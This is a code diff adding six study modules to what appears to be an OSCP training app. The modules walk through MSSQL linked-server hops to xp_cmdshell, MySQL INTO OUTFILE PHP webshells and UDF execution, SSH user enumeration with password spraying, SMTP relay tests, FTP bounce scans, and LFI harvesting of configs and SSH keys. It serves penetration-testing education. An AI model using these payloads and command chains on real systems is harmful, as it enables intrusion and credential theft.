@@ -3604,4 +3604,150 @@
   };
   Object.keys(PROOF_PRACTICE).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) { var pr = PROOF_PRACTICE[k]; OBOL.STUDY_FIXTURES[k].situation = pr.situation; OBOL.STUDY_FIXTURES[k].choices = pr.choices; OBOL.STUDY_FIXTURES[k].coach = pr.coach; } });
 
+  // --- Phase-3 decision-map gap-fill modules (see docs/DECISION-MAP.md): six services whose
+  // standard OSCP technique had no module. Full fixtures incl. the Your-turn practice inline. ---
+  var GAPFILL = {
+    'mssql-linked-server': {
+      why: "A SQL Server login is rarely the prize by itself; its real value is that SQL Server trusts other SQL Servers. A linked server is a saved connection one instance keeps to another, often with a stored login, and often to a box you cannot reach directly. If the login configured on that link is higher privileged than you are, you hop: run queries on the far instance, and where the link maps to a sysadmin, re-enable and call xp_cmdshell for OS command execution on that host. This is the quiet route from a low-privilege MSSQL login on one machine to code execution as a service account on another. Check your own role first, then map the trusts, because the link is often the only way onward.",
+      cmd: "SELECT name, is_linked FROM sys.servers",
+      tool: "mssqlclient",
+      output: "name              is_linked\n---------------   ---------\nDC01\\SQLEXPRESS   0\nSQL02             1",
+      signal: "SQL02             1",
+      teach: "SQL02 is a linked server (is_linked = 1), a trust this box keeps to another instance. Query through it with OPENQUERY or EXEC AT, and if your link login is sysadmin over there, turn on xp_cmdshell on SQL02 for code execution on that host.",
+      leadup: [
+        { key: "session", label: "You have a SQL session", steps: [
+          { title: "Log in to the database", tool: "mssqlclient", where: "local", cmd: "mssqlclient.py acme.internal/svc_sql:<password>@<target> -windows-auth", out: "[*] ENVCHANGE(DATABASE): master\nSQL (svc_sql  dbo@master)> ", sig: "SQL (svc_sql  dbo@master)> ", teach: "You hold a session as svc_sql, but the prompt does not tell you your privilege; check your role before assuming xp_cmdshell is available." } ] },
+        { key: "role", label: "You checked your role", steps: [
+          { title: "Am I sysadmin here?", tool: "mssqlclient", where: "target", cmd: "SELECT IS_SRVROLEMEMBER('sysadmin')", out: "-----------\n0", sig: "-----------\n0", teach: "A zero means you are not sysadmin on this instance, so xp_cmdshell is off limits here. The linked server is how you get a higher-privileged context." } ] }
+      ],
+      how: { lead: "Linked servers are a four-step hop: map the trust, see who the link logs in as, impersonate if you can, then run commands on the far box.", items: [
+        { t: "Map the trust", d: "List the instances this server links to. sys.servers (or the older sp_linkedservers) names each linked instance and marks it is_linked.", demo: [ { run: "SELECT name, is_linked FROM sys.servers", out: "name    is_linked\nSQL02   1", sig: "SQL02   1" } ], note: "Any row with is_linked = 1 is a connection you can run queries through." },
+        { t: "See who the link logs in as", d: "Run a query AT the linked server to read its identity and role. A link that lands as a sysadmin on the far instance is the whole game.", demo: [ { run: "EXEC ('SELECT SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')') AT [SQL02]", out: "sa    1", sig: "sa    1" } ], note: "sa with a 1 means your queries run as sysadmin on SQL02, even though you are low-privilege here." },
+        { t: "Impersonate locally when a link is not available", d: "If you can impersonate a higher login on this box, EXECUTE AS LOGIN switches your context. sys.server_permissions lists who you may impersonate.", demo: [ { run: "EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER", out: "sa", sig: "sa" } ], note: "REVERT drops back; this is the single-box version of the same privilege jump." },
+        { t: "Turn the hop into a shell", d: "On a sysadmin context, enable xp_cmdshell and run a command. Through a link, wrap it in EXEC (...) AT so it runs on the far instance.", demo: [ { run: "EXEC ('EXEC sp_configure ''xp_cmdshell'',1;RECONFIGURE;EXEC xp_cmdshell ''whoami''') AT [SQL02]", out: "nt service\\mssqlserver", sig: "nt service\\mssqlserver" } ], note: "The far instance ran whoami as its service account; that is command execution on SQL02." }
+      ] },
+      situation: "You have a SQL session on 10.10.10.10 but your login is not sysadmin, and sys.servers lists a linked server SQL02. What is the move?",
+      choices: ["mssql-linked-server", "mssql-xp-cmdshell", "mssql-login", "crack-identify"],
+      coach: { "mssql-xp-cmdshell": "You are not sysadmin on this box, so xp_cmdshell is blocked here; hop to the linked SQL02, where your link login may be sysadmin.", "mssql-login": "You already have a session; the next step is abusing the trust to SQL02, not logging in again.", "crack-identify": "You have no hash to crack; the path forward is the linked-server trust, not cracking." }
+    },
+  
+    'mysql-outfile-rce': {
+      why: "A MySQL login is often treated as a loot stop, but with two conditions it is a shell. First the account needs the FILE privilege; second secure_file_priv must be empty or point somewhere useful, and you need a directory the web server both serves and lets MySQL write. When those hold, SELECT INTO OUTFILE drops a small PHP file into the web root and you call it over HTTP for command execution. When the web root is not writable but the plugin directory is, the UDF route loads lib_mysqludf_sys and gives you sys_exec instead. INTO OUTFILE is the cleaner exam route, so check your privileges first and reach for it before anything exotic.",
+      cmd: "curl 'http://10.10.10.10/sh.php?c=id'",
+      tool: "curl",
+      output: "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
+      signal: "uid=33(www-data)",
+      teach: "The PHP file you wrote through the database ran id as www-data. You have command execution in the web context now; upgrade it to a reverse shell before the session drops.",
+      leadup: [
+        { key: "session", label: "You have a MySQL session", steps: [
+          { title: "Log in to MySQL", tool: "mysql", where: "local", cmd: "mysql -h <target> -u webapp -p<password>", out: "Welcome to the MariaDB monitor.\nMariaDB [(none)]> ", sig: "MariaDB [(none)]> ", teach: "You hold a session; before looting, check whether this account can write files, because that is the difference between data and a shell." } ] },
+        { key: "filepriv", label: "You confirmed the FILE privilege", steps: [
+          { title: "Can this account write files?", tool: "mysql", where: "target", cmd: "SHOW GRANTS FOR CURRENT_USER()", out: "GRANT SELECT, FILE ON *.* TO `webapp`@`%`", sig: "FILE", teach: "FILE in the grants means INTO OUTFILE is available. Confirm secure_file_priv is empty next, then write to the web root." } ] }
+      ],
+      how: { lead: "INTO OUTFILE is three checks and a write: confirm FILE privilege, confirm you can write where the web server reads, write the shell, then call it.", items: [
+        { t: "Confirm you can write files", d: "The account needs the FILE privilege and secure_file_priv must not fence you out. Read both before trying.", demo: [ { run: "SELECT @@secure_file_priv; SHOW GRANTS FOR CURRENT_USER()", out: "@@secure_file_priv\n\nGRANT SELECT, FILE ON *.* TO `webapp`@`%`", sig: "GRANT SELECT, FILE ON" } ], note: "An empty secure_file_priv plus FILE means you can write anywhere MySQL's user can, including the web root." },
+        { t: "Find a writable web root", d: "You need a directory the web server serves and the mysql user can write. /var/www/html is the common default; confirm the app is served from there.", demo: [ { run: "curl -s http://<target>/ -I", out: "HTTP/1.1 200 OK\nServer: Apache/2.4.41 (Ubuntu)", sig: "Server: Apache/2.4.41 (Ubuntu)" } ], note: "An Ubuntu Apache almost always serves /var/www/html; a Windows IIS target points at C:\\inetpub\\wwwroot instead." },
+        { t: "Write the webshell", d: "SELECT a PHP one-liner INTO OUTFILE in the web root. A single row is enough.", demo: [ { run: "SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/html/sh.php'", out: "Query OK, 1 row affected (0.001 sec)", sig: "Query OK, 1 row affected" } ], note: "If this errors with Errcode 13, the directory is not writable; fall back to the UDF route or another path." },
+        { t: "The UDF fallback", d: "When the web root is not writable but the plugin directory is, load lib_mysqludf_sys and define sys_exec for direct command execution from SQL.", demo: [ { run: "CREATE FUNCTION sys_exec RETURNING INT SONAME 'lib_mysqludf_sys.so'; SELECT sys_exec('id > /tmp/o')", out: "Query OK, 0 rows affected", sig: "Query OK, 0 rows affected" } ], note: "UDF runs as the mysql service account, which is sometimes root on older setups, a privilege bonus over the webshell." }
+      ] },
+      situation: "You have a MySQL session on 10.10.10.10 and SHOW GRANTS lists the FILE privilege. What turns this into a shell?",
+      choices: ["mysql-outfile-rce", "mysql-loot", "mysql-login", "file-upload"],
+      coach: { "mysql-loot": "Looting hashes is worth doing, but FILE privilege lets you skip straight to code execution by writing a webshell.", "mysql-login": "You already have the session; now use its FILE privilege to write a shell.", "file-upload": "That is a web-form technique; here your write primitive is the database itself through INTO OUTFILE." }
+    },
+  
+    'ssh-user-enum': {
+      why: "SSH gives no code execution by itself, so it is easy to write off, but a pre-7.7 OpenSSH leaks which usernames exist. When you send a malformed public-key authentication request, a vulnerable server takes a different path for a real user than for an invalid one, and the timing or response gives the account away. That turns a blind brute into a targeted one: enumerate the valid names first, then spray a likely password only against accounts that actually exist, which is faster and far quieter. Confirm the banner version before you start, because only OpenSSH before 7.7 is affected. The result is a clean list of real users to feed the next step.",
+      cmd: "python3 cve-2018-15473.py --userList users.txt 10.10.10.10",
+      tool: "python3",
+      output: "[+] root is a valid user\n[-] admin is not a valid user\n[+] administrator is a valid user\n[+] j.smith is a valid user",
+      signal: "[+] administrator is a valid user",
+      teach: "Three names came back valid and one did not. Spray a seasonal or leaked password only against root, administrator, and j.smith, not the whole list, so you stay under the lockout and the noise floor.",
+      leadup: [
+        { key: "banner", label: "The banner is pre-7.7", steps: [
+          { title: "Read the SSH version", tool: "nc", where: "local", cmd: "nc <target> 22", out: "SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8", sig: "OpenSSH_7.2p2", teach: "7.2 is before 7.7, so CVE-2018-15473 applies. A 7.7 or newer banner means this enumeration is closed and you should brute or look elsewhere." } ] },
+        { key: "names", label: "You built a candidate list", steps: [
+          { title: "Gather likely usernames", tool: "sh", where: "local", cmd: "cat users.txt", out: "root\nadmin\nadministrator\nj.smith", sig: "j.smith", teach: "Seed the list from names you saw on the website, in SMTP, or in a breach wordlist; the enumeration tells you which are real." } ] }
+      ],
+      how: { lead: "Username enumeration is confirm the version, run the check, then act only on the valid names.", items: [
+        { t: "Confirm the version is vulnerable", d: "Only OpenSSH before 7.7 leaks usernames this way. Read the banner with nc or nmap -sV before spending time on it.", demo: [ { run: "nmap -sV -p22 <target>", out: "22/tcp open  ssh  OpenSSH 7.2p2 Ubuntu", sig: "OpenSSH 7.2p2" } ], note: "A newer banner closes this path; do not keep trying the enumeration against a patched server." },
+        { t: "Run the enumeration", d: "The Metasploit ssh_enumusers module or a standalone CVE-2018-15473 script sends the malformed auth and sorts valid from invalid.", demo: [ { run: "msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_enumusers; set RHOSTS <target>; set USER_FILE users.txt; run; exit'", out: "[+] <target> - User 'administrator' found\n[-] <target> - User 'admin' not found", sig: "User 'administrator' found" } ], note: "Either tool is fine; the signal is the same split between found and not found." },
+        { t: "Spray only the valid users", d: "A confirmed account list makes the password spray targeted. Spray one password across the valid names and watch the lockout policy.", demo: [ { run: "hydra -L valid_users.txt -p 'Autumn2024!' ssh://<target>", out: "[22][ssh] host: <target>   login: j.smith   password: Autumn2024!", sig: "login: j.smith   password: Autumn2024!" } ], note: "One hit and you have a foothold; the enumeration is what made the spray cheap enough to try." }
+      ] },
+      situation: "A scan shows 22/tcp running OpenSSH 7.2p2 and you have a wordlist of candidate names. What is the move?",
+      choices: ["ssh-user-enum", "online-brute-ssh", "ssh-key-login", "crack-identify"],
+      coach: { "online-brute-ssh": "Brute is the next step, but enumerate valid users first on this pre-7.7 OpenSSH so you only spray accounts that exist.", "ssh-key-login": "You have no private key yet; first find which users exist.", "crack-identify": "You have no hash; this is username discovery, not cracking." }
+    },
+  
+    'smtp-open-relay': {
+      why: "A mail server that relays messages for senders and recipients it does not own is an open relay, a real finding on its own and a lever for phishing or internal spoofing. It is quick to test, so it belongs in your port-25 checklist right next to username enumeration. You confirm it by offering a MAIL FROM and a RCPT TO that both sit outside the domains the server is responsible for, and watching for a 250 accept instead of a 550 refusal. This will not hand you a shell, but it is points on the report and sometimes the setup for a credential-harvesting email to a real user. Keep it separate in your head from VRFY and EXPN user enumeration, which is a different check on the same port.",
+      cmd: "nmap --script smtp-open-relay -p25 10.10.10.10",
+      tool: "nmap",
+      output: "PORT   STATE SERVICE\n25/tcp open  smtp\n| smtp-open-relay: Server is an open relay (14/16 tests)\n|_ MAIL FROM:<antispam@example.com> -> RCPT TO:<relaytest@nmap.scanme.org>",
+      signal: "Server is an open relay",
+      teach: "The script relayed mail that neither came from nor was destined for this server's own domains. That is an open relay; record it as a finding, and you can use it to send spoofed internal mail to a real user.",
+      leadup: [
+        { key: "scan", label: "The scan found 25", steps: [
+          { title: "Spot the mail service", tool: "nmap", where: "local", cmd: "nmap -p25 <target>", out: "25/tcp open  smtp", sig: "25/tcp open  smtp", teach: "Port 25 is SMTP; the two quick wins are username enumeration and the open-relay test, both costless." } ] },
+        { key: "banner", label: "The banner named the server", steps: [
+          { title: "Read the SMTP banner", tool: "telnet", where: "local", cmd: "telnet <target> 25", out: "220 mail.acme.internal ESMTP Postfix", sig: "220 mail.acme.internal ESMTP Postfix", teach: "The banner names the mail software and the domain it serves; the relay test uses addresses outside that domain." } ] }
+      ],
+      how: { lead: "Testing a relay is one scan, or a short manual conversation, then knowing what you are looking at.", items: [
+        { t: "Scan it in one shot", d: "The nmap smtp-open-relay script runs sixteen relay patterns and reports whether any are accepted.", demo: [ { run: "nmap --script smtp-open-relay -p25 <target>", out: "| smtp-open-relay: Server is an open relay (14/16 tests)", sig: "Server is an open relay" } ], note: "Any accepted test is a positive; the fraction tells you how permissive the server is." },
+        { t: "Prove it by hand", d: "A manual session makes the finding concrete. HELO, then a MAIL FROM and RCPT TO that are both external, and watch for a 250 on the recipient.", demo: [ { run: "swaks --to external@gmail.com --from spoof@external.net --server <target>", out: "<- 250 2.1.5 Ok\n<- 250 2.0.0 Ok: queued", sig: "250 2.1.5 Ok" } ], note: "A 250 after RCPT TO an outside address is the relay accepting; a 554 or 550 is a correctly locked server." },
+        { t: "Know the difference", d: "Open relay is about forwarding mail for outsiders. VRFY and EXPN user enumeration is a separate check that confirms which local mailboxes exist. Run both, but report them as distinct findings.", note: "Confusing the two costs you marks; the relay has no credential, the user enum has no forwarding." }
+      ] },
+      situation: "25/tcp is open and you want to test the mail server's configuration for a reportable weakness. What confirms an open relay?",
+      choices: ["smtp-open-relay", "recon-smtp", "recon-mail", "password-spray"],
+      coach: { "recon-smtp": "VRFY and EXPN user enumeration is a different check; the open-relay test is about whether the server forwards mail for outsiders.", "recon-mail": "Reading a mailbox needs a credential you do not have; the relay test needs none.", "password-spray": "No credentials or user list are in play here; this is a configuration test, not an authentication attack." }
+    },
+  
+    'ftp-bounce': {
+      why: "The FTP PORT command lets a client tell the server where to open its data connection, and an old server that honors an arbitrary address will connect to a third host on your behalf. That is the FTP bounce, and its real use is scanning: you aim the server's data connection at an internal host you cannot reach directly and read which ports answer. It is niche and mostly retired, but when an engagement puts a bounce-capable FTP server in front of a segment you cannot otherwise touch, it is a free internal port scan from a position you do not normally hold. nmap automates the whole thing with the -b flag. Treat a successful bounce as a pivot-lite finding that maps the next target, not as a shell.",
+      cmd: "nmap -b anonymous:anonymous@10.10.10.10 -p 3306,6379,8080 172.16.5.10",
+      tool: "nmap",
+      output: "Nmap scan report for 172.16.5.10\nPORT     STATE  SERVICE\n3306/tcp open   mysql\n6379/tcp closed redis\n8080/tcp open   http-proxy",
+      signal: "3306/tcp open   mysql",
+      teach: "The FTP server relayed the scan and reported 3306 and 8080 open on an internal host you could not reach directly. That is a map of your next target; pivot toward the services it exposed.",
+      leadup: [
+        { key: "anon", label: "Anonymous FTP works", steps: [
+          { title: "Log in anonymously", tool: "ftp", where: "local", cmd: "ftp <target>", out: "Name (<target>): anonymous\n230 Login successful.", sig: "230 Login successful.", teach: "You must be logged in to issue PORT, and anonymous is enough; the bounce does not need a privileged account." } ] },
+        { key: "port", label: "The server honors PORT", steps: [
+          { title: "Test the PORT command", tool: "ftp", where: "target", cmd: "quote PORT 172,16,5,10,0,3306", out: "200 PORT command successful.", sig: "200 PORT command successful.", teach: "A 200 means the server will open data connections where you tell it; a 500 means the bounce is blocked and this path is closed." } ] }
+      ],
+      how: { lead: "A bounce is confirm a login, confirm the PORT command, then let nmap scan through the server.", items: [
+        { t: "Confirm a login", d: "You need to be authenticated to issue PORT, but anonymous almost always suffices on a bounce-capable server.", demo: [ { run: "ftp <target>", out: "230 Login successful.", sig: "230 Login successful." } ], note: "No anonymous and no credential means no bounce; move on." },
+        { t: "Test the PORT command", d: "Issue a raw PORT aimed at an internal host and port. A 200 is a green light; a 500 or 501 means the server refuses redirected data connections.", demo: [ { run: "quote PORT 172,16,5,10,0,3306", out: "200 PORT command successful.", sig: "200 PORT command successful." } ], note: "The last two numbers encode the port: 0,3306 means high-byte 0 times 256 plus 3306." },
+        { t: "Scan through it", d: "nmap -b wraps the whole dance. Point it at the FTP server for the bounce and at the internal host for the target.", demo: [ { run: "nmap -b anonymous:anonymous@<target> -p 1-1000 172.16.5.10", out: "3306/tcp open   mysql\n8080/tcp open   http-proxy", sig: "3306/tcp open   mysql" } ], note: "The open ports on the internal host are your pivot shortlist; chase the service you know how to attack." }
+      ] },
+      situation: "An anonymous FTP server on 10.10.10.10 accepts the PORT command, and 172.16.5.10 is unreachable from your box. What is the move?",
+      choices: ["ftp-bounce", "recon-ftp", "ftp-upload-webshell", "online-brute-ftp"],
+      coach: { "recon-ftp": "You already enumerated the FTP share; the new opportunity is bouncing a scan through it to an internal host you cannot otherwise reach.", "ftp-upload-webshell": "That needs a writable web root; here the lever is the PORT command, not an upload.", "online-brute-ftp": "You already have anonymous access, which is all the bounce needs; no brute required." }
+    },
+  
+    'lfi-secret-harvest': {
+      why: "A confirmed local file include is not the finish line, it is a read primitive, and the real work is turning arbitrary file reads into credentials. Start with the predictable files: /etc/passwd for usernames, service and application configs for database and app passwords, and SSH private keys under home directories. When the raw include executes or mangles PHP source, switch to the php://filter base64 wrapper to pull the source out cleanly and read the secrets inside. Everything you recover feeds the credential loop: a cracked hash, a reused password, or a key that logs you straight in. If the app also lets you write, log poisoning upgrades the read into code execution, but harvesting secrets is the dependable first move and often enough on its own.",
+      cmd: "curl 'http://10.10.10.10/index.php?page=php://filter/convert.base64-encode/resource=config'",
+      tool: "curl",
+      output: "PD9waHAKJGRiX3VzZXIgPSAnd2ViYXBwJzsKJGRiX3Bhc3MgPSAnUzNjcjN0UGFzcyEnOwo=",
+      signal: "PD9waHA",
+      teach: "The base64 wrapper returned the config source without executing it. Decode it (base64 -d) and the database username and password are in cleartext inside, a candidate you can reuse against other services or feed to the cracker.",
+      leadup: [
+        { key: "lfi", label: "The LFI is confirmed", steps: [
+          { title: "Read a known file", tool: "curl", where: "local", cmd: "curl 'http://<target>/index.php?page=../../../../etc/passwd'", out: "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin", sig: "root:x:0:0:root", teach: "A clean /etc/passwd read proves the include reaches the filesystem; now aim it at files that hold secrets." } ] },
+        { key: "wrapper", label: "PHP source came back blank", steps: [
+          { title: "The include executed the source", tool: "curl", where: "local", cmd: "curl 'http://<target>/index.php?page=config.php'", out: "<html><body>Welcome back</body></html>", sig: "<html><body>Welcome back</body></html>", teach: "A rendered page with no PHP in it means the server executed the file instead of printing it; the php://filter wrapper pulls the raw source instead." } ] }
+      ],
+      how: { lead: "Harvesting is a tour of the files a web user can read: system accounts, app config, keys, then into the credential loop.", items: [
+        { t: "Read the obvious files", d: "Start with /etc/passwd for user names and shells, then /etc/hosts and any app path you can guess. These confirm the read and name your targets.", demo: [ { run: "curl 'http://<target>/index.php?page=../../../../etc/passwd'", out: "root:x:0:0:root:/root:/bin/bash", sig: "root:x:0:0:root" } ], note: "The users with real shells are the accounts worth a password or a key." },
+        { t: "Pull PHP source with the filter wrapper", d: "When the include runs the source instead of printing it, php://filter base64-encodes the file so you get the raw bytes, config secrets and all.", demo: [ { run: "curl 'http://<target>/index.php?page=php://filter/convert.base64-encode/resource=config'", out: "PD9waHAKJGRiX3Bhc3MgPSAnUzNjcjN0UGFzcyEnOwo=", sig: "PD9waHA" } ], note: "Decode with base64 -d; database and API credentials live in these config files." },
+        { t: "Grab SSH keys", d: "A readable private key under a home directory is a direct login. Try the users you found in /etc/passwd.", demo: [ { run: "curl 'http://<target>/index.php?page=../../../../home/j.smith/.ssh/id_rsa'", out: "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAA", sig: "BEGIN OPENSSH PRIVATE KEY" } ], note: "Save it, chmod 600, and ssh in as that user; a passphrase can be cracked with ssh2john." },
+        { t: "Feed the loot into the loop", d: "Decode configs, identify any hash, then crack or reuse. A recovered password often unlocks SSH, the database, or an admin panel elsewhere on the box.", note: "This is why LFI matters: it does not run code, but it hands you the credentials that do." }
+      ] },
+      situation: "You confirmed an LFI on a PHP app that reads files as www-data. What turns the read into access?",
+      choices: ["lfi-secret-harvest", "lfi-probe", "file-upload", "command-injection"],
+      coach: { "lfi-probe": "That is how you confirmed the LFI; now harvest the configs, keys, and hashes it can read.", "file-upload": "No upload form is in play; your primitive is the include reading files, not writing them.", "command-injection": "The include reads files, it does not run commands yet; harvest secrets, or try log poisoning as a separate step." }
+    }
+  };
+  Object.keys(GAPFILL).forEach(function (k) { OBOL.STUDY_FIXTURES[k] = GAPFILL[k]; });
+
 })(typeof globalThis !== 'undefined' ? globalThis : this);
